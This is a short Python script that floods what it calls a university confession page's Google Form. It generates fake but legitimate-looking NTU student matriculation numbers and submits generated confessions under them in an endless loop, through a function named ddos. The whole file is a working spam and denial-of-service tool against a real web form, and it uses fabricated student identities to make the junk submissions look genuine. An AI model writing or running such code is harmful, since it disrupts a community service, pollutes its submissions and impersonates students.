import random
from time import sleep

from confession_data import confession_generator
from config import CONFESSION_PAGE_GOOGLE_FORM_LINK
from google_form_handler import get_questions, submit_response_factory


def student_matriculation_number_generator():
    """ NTU """
    student_type_probabilities = {35: 'U', 30: 'G', 20: 'P', 10: 'D'}
    matriculation_year_range = (15, 18)
    school_code = [1, 2, 3, 4, 5]
    unique_identifier_length = 4
    letter_suffix = 'abcdefghijkl'
    letter_suffix = letter_suffix + (letter_suffix.upper())

    # TODO: Work with checksum
    # For now just create a legit looking one
    student_type = 'U'  # Default
    while True:
        student_type_score = random.randint(0, 100)
        for student_probability_threshold, student_type in student_type_probabilities.items():
            student_type = student_type
            if student_type_score > student_probability_threshold:
                break
        year = random.randint(*matriculation_year_range)
        school = random.choice(school_code)
        unique_identifier = random.randint(10 ** (unique_identifier_length - 2), 99 ** (unique_identifier_length - 2))
        random_letter = random.choice(letter_suffix)

        matriculation_number = f"{student_type}{year}{school}{unique_identifier}{random_letter}"

        yield matriculation_number


def ddos(sleep_time=1):
    # Generators
    google_form_format_generator = get_questions(CONFESSION_PAGE_GOOGLE_FORM_LINK, refresh_counter=1000)
    student_id_generator = student_matriculation_number_generator()
    confessions = confession_generator(checkpoint=50)

    form_sender = submit_response_factory(CONFESSION_PAGE_GOOGLE_FORM_LINK, google_form_format_generator, verbose=True)
    submissions = []
    while True:
        student_id = next(student_id_generator)
        confession = next(confessions)

        submission = form_sender(matriculation=student_id, confession=confession)
        submissions.append(submission)
        print(submission)

        sleep(sleep_time)


if __name__ == '__main__':
    ddos(1)
